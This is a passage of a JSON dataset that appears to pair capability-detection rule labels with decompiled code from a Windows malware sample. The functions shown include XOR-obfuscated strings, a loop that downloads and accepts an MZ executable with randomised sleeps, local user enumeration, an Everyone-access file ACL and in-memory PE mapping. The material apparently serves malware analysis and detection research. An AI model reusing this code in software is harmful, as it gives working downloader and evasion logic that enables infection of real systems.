< 0x14);\n                var_48h = 0x1d290262;\n                var_44h = 0x20152416;\n                var_40h = 0x17221743;\n                var_3ch = 0x3d2b2629;\n                var_38h = 0x1c340272;\n                var_34h = CONCAT31(var_34h._1_3_, 0x79);\n                var_10h = 0x79476330;\n                var_ch = 0x49594979;\n                fcn.00401000(0x15);\n                iVar10 = var_4h;\n                uVar12 = 0;\n                do {\n                    puVar1 = uVar12 + var_4h;\n                    uVar7 = uVar12 & 0x80000007;\n                    if (uVar7 < 0) {\n                        uVar7 = (uVar7 - 1 | 0xfffffff8) + 1;\n                    }\n                    uVar12 = uVar12 + 1;\n                    *puVar1 = *(&var_10h + uVar7) ^ puVar1[&var_48h - var_4h];\n                    pcVar2 = _sym.imp.KERNEL32.dll_SetEnvironmentVariableA;\n                } while (uVar12 < 0x15);\n                (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableA)(var_94h, var_24h);\n                (*pcVar2)(var_28h, &var_128h);\n                (*pcVar2)(iVar6, 0x41ba54);\n                (*pcVar2)(iVar10, &var_e8h);\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0xc);\n                puVar9 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n                puVar14 = puVar9;\n                for (iVar6 = 0xc; iVar6 != 0; iVar6 = iVar6 + -1) {\n                    *puVar14 = 0;\n                    puVar14 = puVar14 + 1;\n                }\n                *puVar9 = 0x20;\n                *0x41bd30 = (*_sym.imp.KERNEL32.dll_CreateEventA)(0, 0, 0, 0);\n                pcVar2 = _sym.imp.KERNEL32.dll_CreateThread;\n                *0x41bcd0 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040126d, puVar9, 0, 0);\n                *0x41bcd4 = (*pcVar2)(0, 0, fcn.004057dc, *0x41bd3c, 0, 0);\n                *0x41bcd8 = (*pcVar2)(0, 0, fcn.00403619, puVar9, 0, 0);\n                uVar8 = (*pcVar2)(0, 0, fcn.0040cd09, arg_8h, 0, 0);\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar8);\n                pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar10);\n                pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n                uVar8 = (*pcVar3)(0, var_2ch);\n                (*pcVar2)(uVar8);\n                uVar8 = (*pcVar3)(0, var_28h);\n                (*pcVar2)(uVar8);\n                uVar8 = (*pcVar3)(0, var_24h);\n                (*pcVar2)(uVar8);\n                uVar8 = (*pcVar3)(0, var_94h);\n                (*pcVar2)(uVar8);\n                uVar8 = (*pcVar3)(0, var_20h);\n                (*pcVar2)(uVar8);\n                return 0;\n            }\n            uVar12 = uVar12 + 1;\n        } while (uVar12 < 7);\n        (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n    } while( true );\n}\n",
        "token_count": 4929
    },
    "0040557d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.0040557d(void)\n\n{\n    uint8_t *puVar1;\n    bool bVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    uint *puVar8;\n    uint *puVar9;\n    uint lpWSAData;\n    uint ARG_0;\n    uint s;\n    int32_t var_44h;\n    uint var_40h;\n    uint32_t var_3ch;\n    uint var_38h;\n    uint32_t var_34h;\n    char *var_30h;\n    int32_t *var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    char *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_40h = *0x41baa0;\n    var_34h = *0x41bcc0;\n    puVar8 = \"abcdefghijklmnopqrstuvwxyz.-_1234567890\";\n    puVar9 = &s;\n    for (iVar5 = 10; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar9 = *puVar8;\n        puVar8 = puVar8 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    (*_sym.imp.WS2_32.dll_WSAStartup)(0x201, &lpWSAData);\n    var_24h = 0;\n    var_30h = str.QJJIX9.O;\n    do {\n        pcVar7 = var_30h;\n        var_38h = 0;\n        var_3ch = 0;\n        bVar2 = true;\n        iVar5 = 0;\n        do {\n            if ((pcVar7[var_24h] != '\\0') && (iVar3 = (*_sym.imp.ntdll.dll_strchr)(&s, pcVar7[var_24h]),  iVar3 == 0)) {\n                bVar2 = false;\n                break;\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0x20);\n        if (((*pcVar7 != '\\0') && (pcVar7[0x1f] == '\\0')) && (bVar2)) {\n            var_20h = 0x23220345;\n            var_1ch = 0x193d0b0a;\n            puVar8 = &ARG_0;\n            for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n            var_18h = 0x5d696605;\n            puVar8 = &var_10h;\n            for (iVar5 = 8; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n            var_14h._0_2_ = 0x541c;\n            var_8h = 0x4652716a;\n            var_4h._0_2_ = 0x7878;\n            var_4h._2_1_ = 0x54;\n            fcn.00401000(0xe);\n            pcVar7 = var_30h;\n            iVar5 = var_44h;\n            iVar3 = 0;\n            do {\n                var_28h = 7;\n                puVar1 = iVar3 + var_44h;\n                iVar6 = iVar3 % 7;\n                iVar3 = iVar3 + 1;\n                *puVar1 = *(&var_8h + iVar6) ^ puVar1[&var_20h - var_44h];\n            } while (iVar3 < 0xe);\n            (*_sym.imp.USER32.dll_wsprintfA)(&ARG_0, var_44h, var_40h);\n            iVar3 = fcn.00403f8c(0, &ARG_0, &var_3ch, &var_38h);\n            if (iVar3 == 0) {\n                if (var_3ch == 0) {\n                    fcn.0040b172();\n                    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                    break;\n                }\n                if (var_10h < var_3ch) {\n                    fcn.0040b172();\n                    var_34h = var_34h * 0x19660d + 0x3c6ef35f;\n                    (*_sym.imp.KERNEL32.dll_Sleep)(var_34h % 600000 + 60000);\n                }\n                else if (((4 < var_3ch) && (var_3ch == var_10h)) &&\n                        ((var_ch != NULL && ((*var_ch == 'M' && (var_ch[1] == 'Z')))))) {\n                    fcn.0040b11b();\n                    fcn.0040b172();\n                    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                    break;\n                }\n            }\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n        var_30h = pcVar7 + 0x20;\n        var_24h = var_24h + 1;\n    } while (var_30h < 0x41ba50);\n    return *var_2ch != 0;\n}\n",
        "token_count": 1334
    },
    "004057dc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00405856)\n// WARNING: Removing unreachable block (ram,0x00405866)\n// WARNING: Removing unreachable block (ram,0x00405873)\n// WARNING: Removing unreachable block (ram,0x0040587e)\n// WARNING: Removing unreachable block (ram,0x0040588d)\n// WARNING: Removing unreachable block (ram,0x00405895)\n// WARNING: Removing unreachable block (ram,0x00405897)\n// WARNING: Removing unreachable block (ram,0x0040589d)\n// WARNING: Removing unreachable block (ram,0x004058b3)\n\nuint __cdecl fcn.004057dc(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uchar *puVar4;\n    \n    uVar3 = *0x41bcc0;\n    puVar4 = 0x41bd28;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    fcn.004054a0();\n    pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n    (*_sym.imp.KERNEL32.dll_Sleep)(600000);\n    while (*0x41bdf0 == 0) {\n        if (*0x41baa0 == 0) {\n            iVar2 = 0x32;\n        }\n        else {\n            iVar2 = fcn.0040557d();\n            if (iVar2 != 0) {\n                fcn.0040b172();\n            }\n            uVar3 = uVar3 * 0x19660d + 0x3c6ef35f;\n            iVar2 = uVar3 % 600000 + 60000;\n        }\n        (*pcVar1)(iVar2);\n    }\n    return 0;\n}\n",
        "token_count": 433
    },
    "0040592f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040592f(uint param_1, uint *param_2)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint noname_0;\n    uint noname_0_00;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    code *pcVar10;\n    uint var_a0h;\n    int32_t var_9ch;\n    uint var_98h;\n    int32_t var_94h;\n    uint32_t var_90h;\n    int32_t var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint *var_78h;\n    uint *var_74h;\n    int32_t lpMem;\n    uchar *lpDst;\n    uchar *ARG_0;\n    uint32_t var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_78h = NULL;\n    var_a0h = 0;\n    var_98h = 0;\n    var_90h = 0;\n    var_74h = param_2;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x208);\n    puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    lpDst = puVar3;\n    fcn.00406962();\n    if (puVar3 != NULL) {\n        var_60h = 0x5500456e;\n        var_5ch = 0x4b38651b;\n        var_58h = 0x4b144101;\n        for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar3 = 0;\n            puVar3 = puVar3 + 1;\n        }\n        var_54h = 0x450a6831;\n        var_50h = 0x65175564;\n        var_4ch = 0x412c4b25;\n        var_48h = 0x68174b36;\n        var_44h = 0x55324524;\n        var_40h = 0x4b0e6524;\n        var_3ch = 0x4b094131;\n        var_38h = 0x4525682c;\n        var_34h = 0x652e5535;\n        var_30h = 0x412b4b1a;\n        var_2ch = 0x68114b30;\n        var_28h = 0x5504456b;\n        var_24h = 0x4b186533;\n        var_20h = 0x4b3a4129;\n        var_1ch._0_1_ = 0x17;\n        var_1ch._1_2_ = 0x2e68;\n        var_1ch._3_1_ = 0x45;\n        var_18h = 0x65175533;\n        var_14h._0_2_ = 0x4b68;\n        var_8h = 0x5541454b;\n        var_4h._0_2_ = 0x654b;\n        var_4h._2_1_ = 0x68;\n        fcn.00401000(0x9c);\n        puVar3 = lpDst;\n        iVar4 = 0;\n        var_8ch = 7;\n        do {\n            puVar1 = iVar4 + var_94h;\n            iVar6 = iVar4 % 7;\n            iVar4 = iVar4 + 1;\n            *puVar1 = *(&var_8h + iVar6) ^ puVar1[&var_60h - var_94h];\n        } while (iVar4 < 0x4e);\n        (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(var_94h, lpDst, 0x104);\n        var_30h = 0x4a1e3911;\n        var_2ch = 0x65375a00;\n        var_28h = 0x4a0a3907;\n        var_24h = 0x65315a03;\n        var_20h = 0x4a01390d;\n        var_1ch._0_1_ = 0x1a;\n        var_1ch._1_2_ = 0x2f5a;\n        var_1ch._3_1_ = 0x65;\n        var_18h = 0x4a673907;\n        var_10h = 0x4a673962;\n        var_ch = 0x65435a73;\n        fcn.00401000(0x38);\n        uVar9 = 0;\n        do {\n            puVar1 = uVar9 + lpMem;\n            uVar5 = uVar9 & 0x80000007;\n            if (uVar5 < 0) {\n                uVar5 = (uVar5 - 1 | 0xfffffff8) + 1;\n            }\n            uVar9 = uVar9 + 1;\n            *puVar1 = *(&var_10h + uVar5) ^ puVar1[&var_30h - lpMem];\n        } while (uVar9 < 0x1c);\n        iVar4 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(puVar3, lpMem);\n        pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        if (iVar4 != 0) {\n            var_3ch = 0x38314b5f;\n            var_38h = 0x7a1b383d;\n            var_34h = 0x445d623f;\n            var_30h = 0x4b286855;\n            var_2ch = 0x382b380d;\n            var_28h = 0x626e7a1c;\n            var_24h = 0x686c4464;\n            var_20h = 0x38114b1b;\n            var_1ch._0_1_ = 0x2f;\n            var_1ch._1_2_ = 0x1b38;\n            var_1ch._3_1_ = 0x7a;\n            var_18h = 0x44386217;\n            var_8h = 0x38624b7a;\n            var_4h._0_2_ = 0x3844;\n            var_4h._2_1_ = 0x68;\n            fcn.00401000(0x50);\n            uVar9 = var_64h;\n            puVar3 = lpDst;\n            iVar4 = 0;\n            do {\n                puVar1 = iVar4 + var_64h;\n                iVar6 = iVar4 % var_8ch;\n                iVar4 = iVar4 + 1;\n                *puVar1 = *(&var_8h + iVar6) ^ puVar1[&var_3ch - var_64h];\n            } while (iVar4 < 0x28);\n            (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(var_64h, lpDst, 0x104);\n            pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uVar9);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        }\n        (*_sym.imp.SHLWAPI.dll_StrCatW)(puVar3, *0x41bd24);\n        iVar4 = fcn.00406313(var_74h);\n        if (iVar4 == 0) {\n            fcn.00405ed0();\n            do {\n                iVar4 = (*_sym.imp.NETAPI32.dll_NetUserEnum)\n                                  (0, 0, 2, &var_78h, 0xffffffff, &var_90h, &var_a0h, &var_98h);\n                var_8h = iVar4;\n                if ((iVar4 == 0) || (iVar4 == 0xea)) {\n                    var_74h = var_78h;\n                    if (var_78h != NULL) {\n                        var_64h = 0;\n                        puVar8 = var_78h;\n                        if (var_90h != 0) {\n                            do {\n                                var_74h = puVar8;\n                                if (puVar8 == NULL) break;\n                                uVar2 = (*pcVar10)(0, 0x208);\n                                ARG_0 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                                if (ARG_0 != NULL) {\n                                    var_84h = 0x520b4973;\n                                    var_80h = 0x564a6939;\n                                    var_7ch = 0x6652783a;\n                                    puVar3 = ARG_0;\n                                    for (iVar4 = 0x208; iVar4 != 0; iVar4 = iVar4 + -1) {\n                                        *puVar3 = 0;\n                                        puVar3 = puVar3 + 1;\n                                    }\n                                    var_10h = 0x52784956;\n                                    var_ch = var_ch & 0xff000000 | 0x6f6966;\n                                    fcn.00401000(0x18);\n                                    puVar8 = var_74h;\n                                    iVar4 = var_9ch;\n                                    iVar6 = 0;\n                                    do {\n                                        puVar1 = iVar6 + var_9ch;\n                                        iVar7 = iVar6 % var_8ch;\n                                        iVar6 = iVar6 + 1;\n                                        *puVar1 = *(&var_10h + iVar7) ^ puVar1[&var_84h - var_9ch];\n                                    } while (iVar6 < 0xc);\n                                    (*_sym.imp.USER32.dll_wsprintfW)(ARG_0, var_9ch, *var_74h, *0x41bd20);\n                                    var_88h = *puVar8;\n                                    iVar6 = fcn.0040bef1(noname_0, var_88h);\n                                    if (iVar6 == 0) {\n                                        fcn.0040b951(noname_0_00, var_88h);\n                                    }\n                                    pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                                    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, ARG_0);\n                                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                                    uVar2 = (*pcVar10)(0, iVar4);\n                                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                                }\n                                puVar8 = puVar8 + 1;\n                                var_64h = var_64h + 1;\n                                var_74h = puVar8;\n                            } while (var_64h < var_90h);\n                        }\n                        goto code_r0x00405d56;\n                    }\n                }\n                else {\ncode_r0x00405d56:\n                    iVar4 = var_8h;\n                    if (var_78h != NULL) {\n                        (*_sym.imp.NETAPI32.dll_NetApiBufferFree)(var_78h);\n                        var_78h = NULL;\n                    }\n                }\n            } while (iVar4 == 0xea);\n            puVar3 = lpDst;\n            if (var_78h != NULL) {\n                (*_sym.imp.NETAPI32.dll_NetApiBufferFree)(var_78h);\n                puVar3 = lpDst;\n            }\n        }\n        uVar2 = (*pcVar10)(0, puVar3);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        uVar2 = (*pcVar10)(0, lpMem);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        uVar2 = (*pcVar10)(0, var_94h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    return 0;\n}\n",
        "token_count": 2909
    },
    "00405db3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00405db3(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_28h;\n    uint var_1ch;\n    uint var_ch;\n    uint var_8h;\n    uint lpflOldProtect;\n    \n    var_28h._0_1_ = 0;\n    lpflOldProtect = 0;\n    puVar3 = &var_28h + 1;\n    for (iVar2 = 6; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_8h = 0;\n    var_ch = 0;\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    *0x41bd40 = fcn.0040b260();\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    fcn.004069d3();\n    iVar2 = fcn.00408582();\n    if (iVar2 != 0) {\n        if (2 < var_28h._1_1_) {\n            iVar2 = 0;\n            if (0 < var_28h._1_1_ - 2) {\n                do {\n                    *0x41bcc0 = *0x41bcc0 + (&var_1ch)[iVar2];\n                    iVar2 = iVar2 + 1;\n                } while (iVar2 < var_28h._1_1_ - 2);\n            }\n        }\n        *0x41bcc0 = *0x41bcc0 ^ 0x43103655;\n        fcn.0040439a();\n    }\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(str.QJJIX9.O, 0x184, 0x40, &lpflOldProtect);\n    fcn.0040b086();\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(str.QJJIX9.O, 0x184, lpflOldProtect, &lpflOldProtect);\n    fcn.0040cd32();\n    fcn.0040cd32();\n    (*_sym.imp.KERNEL32.dll_GlobalAddAtomW)(*0x41bd20);\n    (*_sym.imp.KERNEL32.dll_AddAtomW)(*0x41bd20);\n    iVar2 = fcn.00406008(&var_ch);\n    if (iVar2 == 0) {\n        fcn.00406962();\n        fcn.0040592f();\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    return;\n}\n",
        "token_count": 622
    },
    "00405ed0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00405ed0(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint pIdentifierAuthority;\n    uint var_ch;\n    int32_t pDacl;\n    int32_t pSid;\n    \n    pSid = 0;\n    pDacl = 0;\n    pIdentifierAuthority = 0;\n    var_ch._0_1_ = 0;\n    var_ch._1_1_ = 1;\n    (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)(&pIdentifierAuthority, 1, 0, 0, 0, 0, 0, 0, 0, 0, &pSid);\n    puVar3 = &var_30h;\n    for (iVar2 = 0x20; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_30h = 0xffffffff;\n    var_14h = pSid;\n    var_2ch = 1;\n    var_28h = 0;\n    var_1ch = 0;\n    var_18h = 5;\n    (*_sym.imp.ADVAPI32.dll_SetEntriesInAclW)(1, &var_30h, 0, &pDacl);\n    iVar2 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(0x40, 0x14);\n    (*_sym.imp.ADVAPI32.dll_InitializeSecurityDescriptor)(iVar2, 1);\n    (*_sym.imp.ADVAPI32.dll_SetSecurityDescriptorDacl)(iVar2, 1, pDacl, 0);\n    (*_sym.imp.ADVAPI32.dll_SetFileSecurityW)(param_1, 4, iVar2);\n    if (pSid != 0) {\n        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_LocalFree;\n    if (pDacl != 0) {\n        (*_sym.imp.KERNEL32.dll_LocalFree)(pDacl);\n    }\n    if (iVar2 != 0) {\n        (*pcVar1)(iVar2);\n    }\n    return;\n}\n",
        "token_count": 563
    },
    "00406840": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00406840(char *param_1, char *param_2)\n\n{\n    uint uVar1;\n    char *pcVar2;\n    char *pcVar3;\n    uint uVar4;\n    char *pcVar5;\n    uint var_4h;\n    \n    uVar4 = 0;\n    if (param_1 != NULL) {\n        if (param_2 == 0xffffffff) {\n            param_2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(param_1);\n        }\n        pcVar2 = param_2;\n        if (1 < param_2) {\n            do {\n                pcVar2 = pcVar2 + -1;\n                if (pcVar2 < 0) goto code_r0x0040687a;\n            } while (param_1[pcVar2] != '\\\\');\n            pcVar2 = param_1 + pcVar2;\n            if (pcVar2 != NULL) {\n                param_2 = param_1 + (param_2 - (pcVar2 + 1));\n                param_1 = pcVar2 + 1;\n            }\n        }\ncode_r0x0040687a:\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, param_2 + 1);\n        pcVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if (pcVar2 != NULL) {\n            pcVar5 = pcVar2;\n            pcVar3 = param_2;\n            if ((*param_1 == '\\\"') && (param_1[param_2 + -1] == '\\\"')) {\n                param_2 = param_2 + -2;\n                param_1 = param_1 + 1;\n                pcVar3 = param_2;\n            }\n            for (; param_2 != NULL; param_2 = param_2 + -1) {\n                *pcVar5 = *param_1;\n                param_1 = param_1 + 1;\n                pcVar5 = pcVar5 + 1;\n            }\n            pcVar2[pcVar3] = '\\0';\n            (*_sym.imp.ntdll.dll__strupr)(pcVar2);\n            uVar4 = fcn.004037a5();\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, pcVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 542
    },
    "00406d51": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406d51(uchar *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uchar *in_ECX;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t *piVar9;\n    uchar *in_EDX;\n    int32_t *piVar10;\n    uchar *puVar11;\n    int32_t iVar12;\n    uchar *puVar13;\n    uint32_t uVar14;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_EDX + 0x3c);\n    uVar2 = *(in_EDX + iVar3 + 0x14);\n    var_ch = *(in_EDX + iVar3 + 6);\n    iVar12 = *(in_EDX + iVar3 + 0x3c);\n    puVar11 = in_EDX;\n    puVar13 = in_ECX;\n    for (iVar7 = *(in_EDX + iVar3 + 0x54); iVar7 != 0; iVar7 = iVar7 + -1) {\n        *puVar13 = *puVar11;\n        puVar11 = puVar11 + 1;\n        puVar13 = puVar13 + 1;\n    }\n    if (var_ch != 0) {\n        piVar10 = in_EDX + uVar2 + 0x2c + iVar3;\n        do {\n            uVar8 = iVar12 + -1 + piVar10[-1] & ~(iVar12 - 1U);\n            if (uVar8 != 0) {\n                puVar11 = in_EDX + *piVar10;\n                puVar13 = in_ECX + piVar10[-2];\n                for (; uVar8 != 0; uVar8 = uVar8 - 1) {\n                    *puVar13 = *puVar11;\n                    puVar11 = puVar11 + 1;\n                    puVar13 = puVar13 + 1;\n                }\n            }\n            piVar10 = piVar10 + 10;\n            var_ch = var_ch - 1;\n        } while (var_ch != 0);\n    }\n    if (arg_8h == NULL) {\n        arg_8h = in_ECX;\n    }\n    iVar12 = iVar3 + 0xa0;\n    if (*(in_EDX + iVar3 + 4) == -0x799c) {\n        iVar12 = iVar3 + 0xb0;\n    }\n    iVar7 = *(in_EDX + iVar12);\n    if ((iVar7 != 0) && (uVar8 = *(in_EDX + iVar12 + 4),  uVar8 != 0)) {\n        if (*(in_EDX + iVar3 + 4) == -0x799c) {\n            iVar12 = *(in_EDX + iVar3 + 0x30);\n        }\n        else {\n            iVar12 = *(in_EDX + iVar3 + 0x34);\n        }\n        puVar11 = *(in_EDX + iVar3 + 0x30);\n        uVar5 = arg_8h - *(in_EDX + iVar3 + 0x30);\n        iVar3 = *(in_EDX + iVar3 + 0x34);\n        piVar10 = in_ECX + iVar7;\n        for (; 8 < uVar8; uVar8 = uVar8 - *piVar9) {\n            iVar7 = *piVar10;\n            uVar14 = piVar10[1] - 8U >> 1;\n            if ((piVar10[1] <= uVar8) && (uVar14 != 0)) {\n                piVar9 = piVar10 + 2;\n                do {\n                    uVar2 = *piVar9;\n                    if (uVar2 >> 0xc == 3) {\n                        *(in_ECX + (uVar2 & 0xfff) + iVar7) = arg_8h + (*(in_ECX + (uVar2 & 0xfff) + iVar7) - iVar12);\n                    }\n                    else if (uVar2 >> 0xc == 10) {\n                        uVar6 = uVar2 & 0xfff;\n                        puVar1 = in_ECX + uVar6 + iVar7;\n                        uVar4 = *puVar1;\n                        *puVar1 = *puVar1 + uVar5;\n                        *(in_ECX + uVar6 + 4 + iVar7) =\n                             *(in_ECX + uVar6 + 4 + iVar7) + (((arg_8h >> 0x1f) - iVar3) - (arg_8h < puVar11)) +\n                             CARRY4(uVar4, uVar5);\n                    }\n                    piVar9 = piVar9 + 2;\n                    uVar14 = uVar14 - 1;\n                } while (uVar14 != 0);\n            }\n            piVar9 = piVar10 + 1;\n            piVar10 = piVar10 + piVar10[1];\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1180
    },
    "004074c9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
